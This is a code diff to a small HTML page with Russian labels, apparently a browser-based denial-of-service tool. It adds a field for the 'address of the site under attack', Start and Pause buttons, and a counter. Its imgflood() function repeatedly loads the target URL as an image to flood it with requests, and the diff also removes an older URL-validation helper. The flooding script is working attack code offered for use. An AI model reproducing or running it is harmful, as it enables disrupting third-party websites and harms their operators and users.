@@ -6,15 +6,13 @@
 </head>
 <body>
 
+<input type="text" id="url_input" placeholder="Адрес атакуемого сайта"><br>
 <button type="button" onclick=push()>Старт</button>
-<input type="text" id="url_input"><br>
-<button type="button" onclick=get_text()>ping111</button>
 <button type="button" onclick=pause()>Пауза</button>
+
 <br>Количество отправленных запросов<br>
 <input type="text" id="requests_count"><br>
 </body>
-
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.0/jquery.min.js"></script>
 
 
 <script type="text/javascript">
@@ -22,46 +20,15 @@
     var requests_count = 0
 
     function pause() {
-        // document.getElementById('url_input').value = 'aaaaaa'
         clearInterval(refreshIntervalId);
     }
 
-    function isValidURL(url) {
-        var encodedURL = encodeURIComponent(url);
-        var isValid = false;
-
-        $.ajax({
-            url: "http://query.yahooapis.com/v1/public/yql?q=select%20*%20from%20html%20where%20url%3D%22" + encodedURL + "%22&format=json",
-            type: "get",
-            async: false,
-            dataType: "json",
-            success: function (data) {
-                isValid = data.query.results != null;
-            },
-            error: function () {
-                isValid = false;
-            }
-        });
-
-        return isValid;
-    }
-
-    function get_text() {
-
-        var input_value = document.getElementById('url_input').value
-        var isValid = isValidURL(input_value);
-        alert(isValid ? "Valid URL!!!" : "Damn...");
-
-        // alert(input_value)
-    }
 
     function push() {
         function imgflood() {
             requests_count += 1
             var TARGET = document.getElementById('url_input').value
             var pic = new Image()
-            // pic.src = 'http://' + TARGET + URI + rand
-            // pic.src = 'https://ru.wikipedia.org/'
             pic.src = TARGET
             document.getElementById('requests_count').value = requests_count.toString()
         }
